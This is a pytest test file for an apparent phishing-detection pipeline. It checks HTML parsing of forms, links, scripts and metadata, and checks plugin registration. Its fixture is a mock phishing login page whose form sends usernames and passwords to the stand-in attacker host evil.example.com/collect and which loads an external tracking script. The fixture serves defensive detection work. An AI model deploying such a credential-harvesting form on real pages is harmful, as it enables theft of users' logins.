"""Tests for the VigilWolf v2 Worker Pipeline (build_snapshot_context, get_registered_plugins)."""
import os
import pytest

# Ensure ENABLED_PLUGINS is set before importing worker / registry modules,
# so get_execution_groups() and get_registered_plugins() use a predictable set.
os.environ.setdefault(
    "ENABLED_PLUGINS",
    "whois_enricher,dns_enricher,login_detector,keyword_detector,brand_match,"
    "external_js_detector,nrd_age_scorer,html_hasher,ioc_extractor",
)

from plugins.base import SnapshotContext, PluginType
from worker import build_snapshot_context, get_registered_plugins


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

SAMPLE_HTML = """\
<!DOCTYPE html>
<html>
<head>
    <title>PhishBank - Secure Login</title>
    <meta name="description" content="Verify your account">
    <meta charset="utf-8">
</head>
<body>
    <h1>Welcome</h1>
    <p>Please enter your credentials below.</p>
    <form action="https://evil.example.com/collect" method="POST">
        <input type="hidden" name="sid" value="abc123">
        <input type="text" name="user" placeholder="Username">
        <input type="password" name="pass" placeholder="Password">
        <button type="submit">Sign In</button>
    </form>
    <p>Or visit our <a href="https://evil.example.com/help">help page</a>.</p>
    <script src="https://cdn.evil.example.com/track.js"></script>
    <script>var x = 42;</script>
</body>
</html>
"""


# ---------------------------------------------------------------------------
# test_build_snapshot_context
# ---------------------------------------------------------------------------

def test_build_snapshot_context():
    """Parse SAMPLE_HTML and verify all SnapshotContext fields are populated."""
    ctx = build_snapshot_context(
        snapshot_id="snap-001",
        domain="phish.example.com",
        html=SAMPLE_HTML,
        snapshot_record={"id": "snap-001", "domain_id": "d1"},
    )

    # --- Identity ---
    assert ctx.snapshot_id == "snap-001"
    assert ctx.domain == "phish.example.com"

    # --- Raw HTML preserved ---
    assert "type=\"password\"" in ctx.html

    # --- Visible text ---
    assert "Welcome" in ctx.text
    assert "credentials" in ctx.text

    # --- Forms ---
    assert len(ctx.forms) == 1
    form = ctx.forms[0]
    assert form["has_password"] is True, "should detect password input"
    assert form["has_hidden"] is True, "should detect hidden input"
    assert form["action"] == "https://evil.example.com/collect"
    assert form["method"].upper() == "POST"

    # --- Links ---
    assert any("help" in link for link in ctx.links), "should extract <a> href links"

    # --- Scripts ---
    assert len(ctx.scripts) == 2, "should find one external + one inline script"
    external = [s for s in ctx.scripts if s.get("src")]
    inline = [s for s in ctx.scripts if s.get("inline")]
    assert len(external) == 1
    assert "track.js" in external[0]["src"]
    assert len(inline) == 1
    assert "var x" in inline[0]["inline"]

    # --- Metadata ---
    assert ctx.metadata["title"] == "PhishBank - Secure Login"
    meta_desc = ctx.metadata.get("meta", {}).get("description")
    assert meta_desc == "Verify your account"


# ---------------------------------------------------------------------------
# test_get_registered_plugins_returns_enabled_only
# ---------------------------------------------------------------------------

def test_get_registered_plugins_returns_enabled_only():
    """get_registered_plugins should only return plugins listed in ENABLED_PLUGINS."""
    # Import all plugin modules so they register via @register_plugin
    import plugins.login_detector      # noqa: F401
    import plugins.keyword_detector    # noqa: F401
    import plugins.brand_match         # noqa: F401
    import plugins.external_js_detector # noqa: F401
    import plugins.nrd_age_scorer      # noqa: F401
    import plugins.html_hasher         # noqa: F401
    import plugins.ioc_extractor       # noqa: F401

    plugins_list = get_registered_plugins()
    plugin_names = {p.name for p in plugins_list}

    # Should contain the core enabled plugins (whois/dns enrichers need network)
    expected = {
        "login_detector",
        "keyword_detector",
        "brand_match",
        "external_js_detector",
        "nrd_age_scorer",
        "html_hasher",
        "ioc_extractor",
    }
    # whois/dns enrichers may or may not appear depending on library availability
    assert expected.issubset(plugin_names), f"Expected {expected} subset of {plugin_names}"

    # Each returned plugin should be an instance of AnalysisPlugin
    from plugins.base import AnalysisPlugin
    for p in plugins_list:
        assert isinstance(p, AnalysisPlugin), f"{p.name} is not an AnalysisPlugin instance"